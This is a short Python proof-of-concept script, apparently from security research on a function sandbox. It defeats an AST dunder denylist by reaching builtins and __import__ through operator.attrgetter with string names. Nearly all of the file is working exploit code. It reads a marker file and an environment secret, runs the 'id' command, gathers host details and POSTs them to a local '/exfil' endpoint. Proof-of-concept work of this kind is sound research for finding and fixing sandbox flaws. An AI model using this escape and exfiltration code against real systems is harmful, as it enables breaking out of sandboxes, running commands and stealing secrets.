# /// script
# dependencies = ["packaging==24.2"]
# requires-python = ">=3.14"
# ///
import operator

@pure("poc.attrgetter_bypass.v1")
def exfiltrate(value, **kwargs):
    # All reflection names are strings; no dunder Attribute node for the AST
    # denylist to see. Only the missing __import__ stops this on restricted
    # builtins.
    builtins = operator.attrgetter("__globals__")(pure)["__builtins__"]
    imp = operator.attrgetter("__import__")(builtins)
    os = imp("os")
    json = imp("json")
    urllib_request = imp("urllib.request", fromlist=["Request"])
    port = os.environ.get("POC_PORT", "8901")
    proof = {
        "marker": open("/tmp/opencode/julep-hard/marker.txt", "r").read().strip(),
        "secret_env": os.environ.get("POC_SECRET", "<missing>"),
        "uid": os.popen("id").read().strip(),
        "hostname": os.uname().nodename,
        "cwd": os.getcwd(),
        "pid": os.getpid(),
    }
    body = json.dumps(proof, sort_keys=True).encode()
    req = urllib_request.Request(
        "http://127.0.0.1:" + port + "/exfil",
        data=body,
        headers={"Content-Type": "application/json"},
    )
    urllib_request.urlopen(req, timeout=10).read()
    return {"exfiltrated": True, "proof": proof}
